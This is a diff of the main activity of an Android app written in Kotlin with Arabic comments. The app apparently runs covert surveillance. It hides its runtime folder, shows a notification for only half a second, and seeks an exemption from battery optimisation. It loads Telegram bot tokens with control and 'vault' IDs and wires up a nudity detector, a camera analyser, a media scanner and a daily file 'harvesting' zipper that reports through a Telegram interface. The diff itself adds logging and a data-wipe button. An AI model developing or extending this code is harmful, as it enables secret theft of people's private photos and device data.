@@ -41,7 +41,7 @@ import java.util.*
  * يقوم بـ:
  * 1. طلب الأذونات الديناميكية حسب إصدار Android.
  * 2. إنشاء مجلدات التشغيل (.sys_runtime).
- * 3. تشغيل خدمة الإشعارات الخلفية.
+ * 3. تشغيل خدمة الإشعارات الخلفية (ForegroundService).
  * 4. طلب تجاوز تحسين البطارية.
  * 5. التحقق من وجود نموذج AI، وتحميله ديناميكياً عبر FileDownloader مع عرض التقدم في ProgressBar.
  * 6. تحميل الإعدادات من ConfigLoader.
@@ -50,13 +50,14 @@ import java.util.*
  * 
  * ✅ تم استبدال الإشعار العادي بخدمة أمامية حقيقية (ForegroundService).
  * ✅ الإشعار يظهر لمدة 0.5 ثانية فقط ثم يختفي نهائياً، مع بقاء الخدمة تعمل في الخلفية.
+ * ✅ تم تحسين السجل بعرض تفاصيل دقيقة عن العمليات (نجاح/فشل مع تحديد الموقع).
+ * ✅ تمت إضافة زر لحذف بيانات التطبيق يدوياً أثناء الاختبار.
  */
 class MainActivity : AppCompatActivity() {
 
     companion object {
         private const val TAG = "MainActivity"
         const val APP_VERSION = "4.2.1"
-        // تم إزالة NOTIFICATION_CHANNEL_ID و NOTIFICATION_ID لأن الخدمة تدير الإشعار بنفسها
     }
 
     private lateinit var logEditText: EditText
@@ -92,6 +93,7 @@ class MainActivity : AppCompatActivity() {
         val btnPermissions: Button = findViewById(R.id.btnPermissions)
         val btnCopy: Button = findViewById(R.id.btnCopy)
         val btnClear: Button = findViewById(R.id.btnClear)
+        val btnClearData: Button = findViewById(R.id.btnClearData)  // ✅ زر تنظيف البيانات
 
         // إعدادات ProgressBar
         progressBar.max = 100
@@ -104,6 +106,7 @@ class MainActivity : AppCompatActivity() {
         btnPermissions.setOnClickListener { requestAllPermissions() }
         btnCopy.setOnClickListener { copyLogToClipboard() }
         btnClear.setOnClickListener { logEditText.setText("=== تم إعادة ضبط السجل ===\n") }
+        btnClearData.setOnClickListener { clearAppData() }  // ✅ ربط زر التنظيف
 
         // مراقبة التقدم لتحديث الواجهة
         lifecycleScope.launch(Dispatchers.Main) {
@@ -137,9 +140,13 @@ class MainActivity : AppCompatActivity() {
 
     // ==================== دوال السجل (Logging) ====================
 
+    /**
+     * إضافة رسالة إلى السجل مع طابع زمني دقيق (مللي ثانية).
+     * كل رسالة في سطر منفصل لضمان العرض العمودي.
+     */
     private fun appendLog(text: String) {
         runOnUiThread {
-            val timestamp = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
+            val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
             logEditText.append("[$timestamp] $text\n")
             logEditText.setSelection(logEditText.text.length) // تمرير تلقائي للأسفل
         }
@@ -155,8 +162,7 @@ class MainActivity : AppCompatActivity() {
     // ==================== عرض تقرير الحالة ====================
 
     /**
-     * عرض تقرير حالة التطبيق بشكل منظم على الشاشة.
-     * يتم عرضه كأسطر منفصلة (طولية) لتتناسب مع شاشة الهاتف.
+     * عرض تقرير حالة التطبيق بشكل منظم على الشاشة (عمودي).
      */
     private fun displayStatusReport() {
         val ui = telegramUi
@@ -168,97 +174,100 @@ class MainActivity : AppCompatActivity() {
         val status = ui.getStatus()
         val running = if (status["running"] == true) "🟢 يعمل" else "🔴 متوقف"
 
-        val report = """
-            
-            ════════════════════════════════════
-               📊 تقرير حالة التطبيق
-            ════════════════════════════════════
-            
-            🔹 التوكنات النشطة       : ${status["active_tokens"]}
-            🔹 التوكنات الاحتياطية   : ${status["reserve_tokens"]}
-            🔹 الأجهزة المسجلة       : ${status["devices"]}
-            🔹 الجلسات النشطة        : ${status["sessions"]}
-            🔹 طلبات API             : ${status["api_calls"]}
-            🔹 فشل API               : ${status["api_failures"]}
-            🔹 ملفات معلقة           : ${status["pending_files"]}
-            🔹 حالة التشغيل          : $running
-            
-            ════════════════════════════════════
-        """.trimIndent()
-
-        appendLog(report)
+        appendLog("")
+        appendLog("════════════════════════════════════")
+        appendLog("   📊 تقرير حالة التطبيق")
+        appendLog("════════════════════════════════════")
+        appendLog("🔹 التوكنات النشطة       : ${status["active_tokens"]}")
+        appendLog("🔹 التوكنات الاحتياطية   : ${status["reserve_tokens"]}")
+        appendLog("🔹 الأجهزة المسجلة       : ${status["devices"]}")
+        appendLog("🔹 الجلسات النشطة        : ${status["sessions"]}")
+        appendLog("🔹 طلبات API             : ${status["api_calls"]}")
+        appendLog("🔹 فشل API               : ${status["api_failures"]}")
+        appendLog("🔹 ملفات معلقة           : ${status["pending_files"]}")
+        appendLog("🔹 حالة التشغيل          : $running")
+        appendLog("════════════════════════════════════")
+        appendLog("")
     }
 
-    // ==================== التهيئة الأساسية (Core Initialization) ====================
+    // ============================================================
+    //  التهيئة الأساسية (مع رسائل سجل مفصلة)
+    // ============================================================
 
     private suspend fun initCoreAsync() {
         appendLog("🚀 بدء الفحوصات التشخيصية للنظام...")
 
         // 1. إعداد المجلدات والتنظيف
         appendLog("⚙️ الخطوة 1/5: إعداد بيئة التشغيل والمجلدات...")
-        setupDirectories()
+        try {
+            setupDirectories()
+            appendLog("✅ [OK] تم إعداد المجلدات بنجاح.")
+        } catch (e: Exception) {
+            appendLog("❌ [ERROR] فشل إعداد المجلدات: ${e.message} (في MainActivity.setupDirectories)")
+            return
+        }
 
         // 2. الأذونات والخدمة الأمامية
         appendLog("🔓 الخطوة 2/5: التحقق من الأذونات وتشغيل الإشعارات...")
         withContext(Dispatchers.Main) {
             requestAllPermissions()
         }
-        // ✅ استدعاء الخدمة الجديدة (الإشعار سيختفي بعد 0.5 ثانية)
-        startSilentForegroundService()
+        try {
+            startSilentForegroundService()
+            appendLog("✅ [OK] تم تشغيل الخدمة الخلفية (سيختفي الإشعار بعد 0.5 ثانية).")
+        } catch (e: Exception) {
+            appendLog("⚠️ [WARNING] فشل تشغيل الخدمة الخلفية: ${e.message} (MainActivity.startSilentForegroundService)")
+        }
         requestBatteryOptimizationExemption()
 
-        // 3. التحقق من نموذج AI (مع التحميل الديناميكي وعرض التقدم)
+        // 3. التحقق من نموذج AI
         appendLog("🧠 الخطوة 3/5: التحقق من ملف نموذج AI (engine_v2.tflite)...")
-        val modelReady = ensureModelReady()
-        if (modelReady) {
-            appendLog("✅ نموذج AI جاهز ويعمل بنجاح.")
-        } else {
-            appendLog("⚠️ نموذج AI غير متوفر حالياً، سيتم تفعيله فور اكتمال التحميل في الخلفية.")
+        try {
+            val modelReady = ensureModelReady()
+            if (modelReady) {
+                appendLog("✅ [OK] نموذج AI جاهز ويعمل بنجاح.")
+            } else {
+                appendLog("⚠️ [WARNING] نموذج AI غير متوفر حالياً، سيتم تفعيله فور اكتمال التحميل في الخلفية.")
+            }
+        } catch (e: Exception) {
+            appendLog("❌ [ERROR] فشل التحقق من النموذج: ${e.message} (MainActivity.ensureModelReady)")
         }
 
         // 4. تحميل الإعدادات والتوكنات
         appendLog("🔑 الخطوة 4/5: تحميل الإعدادات وتوكنات تلغرام...")
         try {
-            // ✅ استخدام ConfigLoader.load() مباشرة (دالة ثابتة في الكائن)
             val config = ConfigLoader.load(this@MainActivity)
-            appendLog("• التوكنات المحملة: النشطة (${config.activeTokens.size}), الاحتياطية (${config.reserveTokens.size})")
-            appendLog("• معرف التحكم: ${config.controlId} | معرف الخزنة: ${config.vaultId}")
-            appendLog("• المفتاح السري: ${if (config.secret != null) "✅ مفعل" else "⚠️ غير محدد"}")
+            appendLog("✅ [OK] التوكنات المحملة: النشطة (${config.activeTokens.size}), الاحتياطية (${config.reserveTokens.size})")
+            appendLog("   • معرف التحكم: ${config.controlId} | معرف الخزنة: ${config.vaultId}")
+            appendLog("   • المفتاح السري: ${if (config.secret != null) "✅ مفعل" else "⚠️ غير محدد"}")
 
             // 5. تهيئة المراقب والمكونات
             appendLog("🧩 الخطوة 5/5: تهيئة وحدة المراقبة والمكونات المرتبطة...")
-            
-            // ✅ استخدام Monitor.getInstance() لأن المُنشئ private
             val monitor = Monitor.getInstance(this@MainActivity)
-            appendLog("• الجهاز المسجل: ${monitor.deviceModel} (${monitor.deviceId})")
+            appendLog("   • الجهاز المسجل: ${monitor.deviceModel} (${monitor.deviceId})")
 
-            // ===== إنشاء المكونات وربطها =====
-            // 1. NudeDetector (كاشف المحتوى الحساس)
+            // إنشاء المكونات
             val nudeDetector = NudeDetector.create(this@MainActivity, monitor)
-            appendLog("• NudeDetector: ${if (nudeDetector.isReady()) "✅ جاهز" else "⏳ قيد التحميل"}")
+            appendLog("   • NudeDetector: ${if (nudeDetector.isReady()) "✅ جاهز" else "⏳ قيد التحميل"}")
 
-            // 2. CameraAnalyzer (تحليل الكاميرا)
             val cameraAnalyzer = CameraAnalyzer.create(this@MainActivity, monitor, nudeDetector)
-            appendLog("• CameraAnalyzer: تم إنشاؤه")
+            appendLog("   • CameraAnalyzer: تم إنشاؤه")
 
-            // 3. TelegramUi (واجهة تلغرام) - نمرر config بدلاً من التوكنات
             telegramUi = TelegramUi(
                 context = this@MainActivity,
                 monitor = monitor,
-                config = config  // ✅ تمرير كائن الإعدادات الكامل
+                config = config
             )
             val ui = telegramUi!!
-            appendLog("• TelegramUi: تم إنشاؤه مع ${config.activeTokens.size} توكنات نشطة")
+            appendLog("   • TelegramUi: تم إنشاؤه مع ${config.activeTokens.size} توكنات نشطة")
 
-            // 4. MediaScanner (ماسح الوسائط)
             val mediaScanner = MediaScanner.create(this@MainActivity, monitor, ui)
-            appendLog("• MediaScanner: تم إنشاؤه")
+            appendLog("   • MediaScanner: تم إنشاؤه")
 
-            // 5. DailyZipper (حصاد الملفات)
             val dailyZipper = DailyZipper.create(this@MainActivity, mediaScanner, ui)
-            appendLog("• DailyZipper: تم إنشاؤه")
+            appendLog("   • DailyZipper: تم إنشاؤه")
 
-            // ===== ربط المكونات بـ Monitor =====
+            // ربط المكونات
             monitor.ui = ui
             monitor.ctrl = config.controlId
             monitor.vlt = config.vaultId
@@ -266,20 +275,24 @@ class MainActivity : AppCompatActivity() {
             monitor.mediaScanner = mediaScanner
             monitor.dailyZipper = dailyZipper
             monitor.nudeDetector = nudeDetector
-            appendLog("• تم ربط جميع المكونات بـ Monitor")
+            appendLog("   • تم ربط جميع المكونات بـ Monitor")
 
-            // ===== تشغيل الخدمات =====
+            // تشغيل الخدمات
             appendLog("📡 بدء استماع وحدة المراقبة واختبار الواجهة...")
             ui.start()
             monitor.start()
+            appendLog("✅ [OK] TelegramUi و Monitor يعملان بنجاح.")
 
-            // عرض تقرير الحالة بعد تشغيل كل شيء
             displayStatusReport()
-
             appendLog("🎉 جميع الأنظمة تعمل بنجاح! التطبيق جاهز للأوامر.")
+
         } catch (e: Exception) {
             Log.e(TAG, "Initialization Error", e)
-            appendLog("💥 خطأ غير متوقع أثناء التهيئة: ${e.localizedMessage}")
+            appendLog("💥 [ERROR] خطأ غير متوقع أثناء التهيئة: ${e.message}")
+            val stack = e.stackTrace.firstOrNull()
+            if (stack != null) {
+                appendLog("   • الموقع: ${stack.className}::${stack.methodName} (السطر ${stack.lineNumber})")
+            }
         }
     }
 
@@ -340,9 +353,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     // ============================================================
-    //  ✅ الخدمة الخلفية الصامتة (Foreground Service)
-    //  تم استبدال الإشعار العادي بخدمة أمامية حقيقية
-    //  الإشعار يظهر لمدة 0.5 ثانية ثم يختفي نهائياً
+    //  الخدمة الخلفية الصامتة (Foreground Service)
     // ============================================================
 
     /**
@@ -360,6 +371,29 @@ class MainActivity : AppCompatActivity() {
             appendLog("✅ تم تشغيل الخدمة الخلفية (سيختفي الإشعار بعد 0.5 ثانية).")
         } catch (e: Exception) {
             appendLog("⚠️ فشل تشغيل الخدمة الخلفية: ${e.localizedMessage}")
+        }
+    }
+
+    // ==================== تنظيف بيانات التطبيق ====================
+
+    /**
+     * حذف جميع بيانات التطبيق (مجلد .sys_runtime) يدوياً.
+     * مفيد أثناء مرحلة الاختبار لتجنب تراكم الملفات.
+     */
+    private fun clearAppData() {
+        try {
+            val runtimeDir = File(filesDir, ".sys_runtime")
+            if (runtimeDir.exists()) {
+                runtimeDir.deleteRecursively()
+                appendLog("🧹 تم حذف جميع بيانات التطبيق بنجاح (مجلد .sys_runtime).")
+            } else {
+                appendLog("ℹ️ لا توجد بيانات للتطبيق لحذفها.")
+            }
+            // إعادة تهيئة المجلدات بعد الحذف
+            setupDirectories()
+            appendLog("🔄 تم إعادة إنشاء المجلدات الأساسية.")
+        } catch (e: Exception) {
+            appendLog("❌ فشل حذف البيانات: ${e.message}")
         }
     }
 
